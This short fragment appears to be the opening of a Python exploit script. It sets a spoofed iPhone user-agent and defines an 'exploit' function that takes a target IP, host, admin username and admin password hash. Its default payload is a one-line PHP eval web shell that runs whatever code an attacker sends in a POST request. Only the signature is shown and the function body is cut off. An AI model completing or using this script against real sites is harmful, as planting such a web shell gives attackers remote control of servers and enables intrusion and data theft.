UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"

def exploit(ip, scheme, host, admin_user, admin_hash, payload="<php>@eval($_POST[1]);</php>"):
